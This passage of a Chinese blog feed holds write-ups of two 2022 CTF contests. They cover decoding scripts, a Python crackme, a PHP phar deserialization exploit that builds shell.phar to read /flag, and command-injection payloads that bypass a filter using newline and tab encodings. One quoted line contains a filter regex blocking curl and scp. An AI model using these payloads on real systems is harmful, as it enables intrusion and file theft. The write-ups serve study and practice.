class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">alist = []</span><br><span class="line"><span class="comment">#line 为那一大串hex value值</span></span><br><span class="line">line = <span class="string">&quot;255044462D312E3520202009092020090D0A25B5B5B5B520202020202020200D0A312030206F626A0D0A3C3C2F547970652F436174616C6F672F50616765732032203020522F4C616E67287A682D434E&quot;</span></span><br><span class="line"><span class="comment"># 先把line两两字符一组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">alist.append(line[i:i+<span class="number">2</span>])</span><br><span class="line"><span class="comment">#判断每组的字符是不是09 或者20  并且  后面七位也必须是  09或20  因为中间可能会有09或20 扰乱我们截取</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)):</span><br><span class="line">    <span class="keyword">if</span> (alist[i] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">1</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">2</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">2</span>] == <span class="string">&quot;20&quot;</span> <span class="keyword">and</span> (alist[i+<span class="number">3</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">3</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">4</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">4</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">5</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">5</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">6</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">6</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">7</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">7</span>] == <span class="string">&quot;20&quot;</span>)):</span><br><span class="line">        s = alist[i]+alist[i+<span class="number">1</span>]+alist[i+<span class="number">2</span>]+alist[i+<span class="number">3</span>]+alist[i+<span class="number">4</span>]+alist[i+<span class="number">5</span>]+alist[i+<span class="number">6</span>]+alist[i+<span class="number">7</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#将09换成1    20换成0</span></span><br><span class="line">        s = s.replace(<span class="string">&quot;09&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        s = s.replace(<span class="string">&quot;20&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="comment"># 00011001</span></span><br><span class="line">        <span class="comment"># 00110010D</span></span><br><span class="line">        <span class="comment"># 0110010D0A</span></span><br><span class="line">        <span class="comment"># 0010D0A25B5B5</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A33</span></span><br><span class="line">        <span class="comment"># 01111000</span></span><br><span class="line">        <span class="comment"># x11110000D</span></span><br><span class="line">        <span class="comment"># 1110000D0A</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A35</span></span><br><span class="line">        <span class="comment"># 01100110</span></span><br><span class="line">        <span class="comment"># f001100D0A36</span></span><br><span class="line">        <span class="comment"># 01100D0A360</span></span><br><span class="line">        <span class="comment">#print(alist[i]+alist[i+1]+alist[i+2]+alist[i+3]+alist[i+4]+alist[i+5]+alist[i+6]+alist[i+7])</span></span><br><span class="line">        <span class="comment">#此时还是一个字符串   用split分割一下</span></span><br><span class="line">        s = s.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment">#判断出来小于8的字符 最后转ascii</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;=<span class="number">8</span>:</span><br><span class="line">                i=<span class="string">&#x27;0b&#x27;</span>+i                   </span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#txtflag&#123;EFAWEOFJ4TUW0Tgy&#125;</span></span><br></pre></td></tr></table></figure><p>emmm 这题150pt感觉有点亏比赛时没有解出来，时间太短了，后面复现的</p><h3 id="奇怪的图片"><a href="#奇怪的图片" class="headerlink" title="奇怪的图片"></a>奇怪的图片</h3><p>开局一个压缩包，是rar文件，解压有密码，通常来说伪加密一般都是zip这里应该不是伪加密，<br>foremost直接分离，也什么都没出来，我们直接strings梭<br>strings 可以将一个文件的hex数据中的可显字符输出出来</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164552419.png" alt="image-20220930164552419"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164817607.png" alt="image-20220930164817607"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164834081.png" alt="image-20220930164834081"><br>666C61677B4A7573745F65617379217DD<br>TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE<br>两个字符串，第一个显然是16进制，直接百度一个转一下<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165049824.png" alt="image-20220930165049824"><br><code>flag&#123;Just_easy!&#125;</code><br>这个字符串解出来是个假的 有兴趣的同学解一下</p><h3 id="未知的编码"><a href="#未知的编码" class="headerlink" title="未知的编码"></a>未知的编码</h3><p> <code>参考代码如下：&lt;div style=&quot;background-image:url(javascript:eval(String.fromCharCode(%66%6C%61%67%7B%64%34%38%65%31%61%34%64%2D%30%34%63%64%2D%34%62%36%34%2D%38%36%65%39%2D%37%37%66%38%66%35%31%32%39%36%30%35%7D)))&quot;&gt; </code><br>ascll你知道怎么解吗？<br>签到题，url解一下就可以了<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165704813.png" alt="image-20220930165704813"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>不会，直接百度<br>参考<code>https://www.jianshu.com/p/7779f3e83384</code></p><h3 id="py逆向"><a href="#py逆向" class="headerlink" title="py逆向"></a>py逆向</h3><p>不是我做的，宇哥做的，我不会<br>参考宇哥的wp<br>题目给出源码  直接百度关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, seed, string</span>):</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> string:</span><br><span class="line">        rst.append((<span class="built_in">ord</span>(v) + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span>)</span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to python crackme&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    en_out = encrypt(KEY1, <span class="number">5</span>, flag)</span><br><span class="line">    <span class="keyword">if</span> KEY2 == en_out:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;You Win,FLAG IS flag&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try Again !&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接替换key2就行了<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_each</span>(<span class="params">key, seed, KEY2</span>):</span></span><br><span class="line">    answer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> KEY2:</span><br><span class="line">        password = each</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            result = (i + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span></span><br><span class="line">            <span class="keyword">if</span> password == result:</span><br><span class="line">                answer += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    answer = decrypt_each(KEY1, <span class="number">5</span>, KEY2)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#得到：</span></span><br><span class="line"><span class="comment">#JGpaOILOVEPYTHONSOMUCHK</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此题参考<code>https://l1nwatch.gitbook.io/ctf/idf-shi-yan-shi/reverse-dao-hang-ni-shi/python-bytecode</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unsortheap"><a href="#unsortheap" class="headerlink" title="unsortheap"></a>unsortheap</h3><p>不会</p><h3 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h3><p>不会</p><blockquote><p>这次的题都能搜到，也没啥好说的，太菜了,web也没啥意思<br>感谢我的小伙伴两小时的努力，很强了<br>宇哥太强了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 市赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022第五空间部分wp</title>
      <link href="/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h3 id="5-简单的Base"><a href="#5-简单的Base" class="headerlink" title="5_简单的Base"></a>5_简单的Base</h3><p>十六进制转一下字符串即可</p><p>666c61677b57656c636f6d655f686572657d</p><p>flag{Welcome_here}</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h3><p>考点：phar反序列化</p><p>经过目录扫描发现  <code>www.zip</code></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$down</span> = <span class="keyword">new</span> check_img();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$up</span> = <span class="keyword">new</span> upload();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!in_array(<span class="keyword">$this</span>-&gt;ext, <span class="keyword">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public function __wakeup(){<br>        echo file_get_contents($this-&gt;filename);<br>    }</p><p>因为这里存在wakeup函数，但是又不存在反序列化的点，所以我们使用phar反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在2020年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>; <span class="comment">//要读取的文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> upload();</span><br><span class="line">@unlink(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行此文件，会生成一个shell.phar文件，然后我们将shell.phar，改为jpg文件上传上去，<br>路径为  upload/shell.jpg</p><p>借助<code>phar://</code>执行代码<br><code>img_name=phar://upload_file/phar.gif</code></p><h3 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h3><p>考点：弱口令，rce，过滤目录分隔符/)、 空格</p><p>爆破一下  admin，admin123<br>过滤的分隔符<code>linux中一些命令分隔符：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</code><br>过滤的空格，可以用<code>%09(tab)、%09、 $&#123;IFS&#125;、$IFS、$IFS$1、$&#123;IFS&#125;$、&lt;、&lt;&gt;这些都可以当做空格符作为代替。</code><br>过滤了cat，可以用 <code>nl，nl：显示的时候，顺便输出行号</code><br><code>ip=%0anl%09index.php</code><br>可以读取源码，太长，贴一下关键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p><code>ip=%0als</code>  ls的时候有一个kylin目录，目录下有一个flag.txt ，但是不能访问<br>且kylin，flag都被过滤了，我们用问号替换其中一个字符即可<br>绕过目录分隔符的话，先cd 到这个目录，再去cat即可</p><p><code>/?ip=%0acd%09ky?in%0anl%09f?ag.txt</code><br>解法不唯一</p><blockquote><p>参考 phar反序列化<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 第五空间 </tag>
            
